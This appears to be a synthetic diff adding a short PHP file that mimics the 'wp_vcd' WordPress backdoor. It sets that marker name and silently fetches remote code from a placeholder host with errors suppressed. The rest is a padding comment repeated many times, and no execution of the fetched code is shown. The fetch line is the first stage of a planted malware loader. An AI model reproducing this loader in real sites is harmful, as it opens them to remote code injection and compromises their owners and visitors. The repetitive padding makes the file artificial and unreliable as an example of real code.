@@ -1,0 +1,5 @@
+<?php
+$div_code_name = 'wp_vcd';
+$tmpcontent = @file_get_contents('http://example.invalid/code.php');
+
+// Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. 
